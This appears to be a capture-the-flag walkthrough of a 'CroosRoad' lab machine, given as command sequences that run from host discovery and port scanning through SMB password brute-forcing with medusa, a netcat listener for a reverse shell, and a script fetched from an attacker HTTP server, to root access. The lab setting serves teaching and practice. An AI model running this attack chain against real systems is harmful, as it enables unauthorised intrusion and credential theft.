# Penetration Testing : CroosRoad Walkthrough





### 1. Identifying the Target
Discover the IP address of the target within a specified network range:
```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

### 2. Scanning Open Ports
Perform a thorough scan to identify open ports and services:
```bash
sudo nmap -v -T4 -A -p- -oN nmap.log 192.168.56.105
```

### 3. Enumerating the Web Server
#### Directory Fuzzing
Use gobuster to identify hidden directories and files:
```bash
gobuster dir -u http://192.168.56.105 -x txt,php,html,bak --wordlist /usr/share/wordlists/dirb/common.txt -o dir.log
```

#### Analyzing Content
Review the content of key files identified during fuzzing:
```bash
wget http://192.168.56.105/note.txt
wget http://192.168.56.105/robots.txt
wget http://192.168.56.105/crossroads.png
```

### 4. Enumerating the SMB Server
#### Initial SMB Mapping
Verify anonymous access and map the SMB shares:
```bash
smbmap -H 192.168.56.105
```

#### Password Cracking
Utilize medusa to crack SMB passwords:
```bash
medusa -u albert -P /home/kali/rockyou.txt -h 192.168.56.105 -M smbnt
```
Log in using the cracked credentials:
```bash
smbmap -H 192.168.56.105 -u albert -p [password]
smbclient \\\\192.168.56.105\\smbshare -U albert
```

### 5. Gaining a Reverse Shell
#### File Transfer and Shell Execution
Transfer and execute a shell script to gain a reverse shell:
```bash
vi smbscript.sh
nc -nvlp 9001
smbclient \\\\192.168.56.105\\smbshare -U albert
put smbscript.sh
```

### 6. Privilege Escalation
#### Exploring Binary Files
Analyze a binary file for vulnerabilities and possible exploitation:
```bash
file beroot
strings beroot
./beroot
```

#### Steganalysis
Extract hidden information from images:
```bash
stegoveritas -out crossroads crossroads.png
cd crossroads/keepers
ls -al
```

### 7. Brute Forcing Binary Execution
Use a custom script to brute force a binary file:
```bash
vi script.sh
python3 -m http.server
wget http://192.168.56.10:8000/script.sh
wget http://192.168.56.10:8000/wordlist.txt
chmod +x script.sh
./script.sh wordlist.txt validpass.txt
cat validpass.txt
```

### 8. Accessing Root Credentials
Finally, switch to the root user and access sensitive information:
```bash
su root
cd /root
ls -al
cat root.txt
```
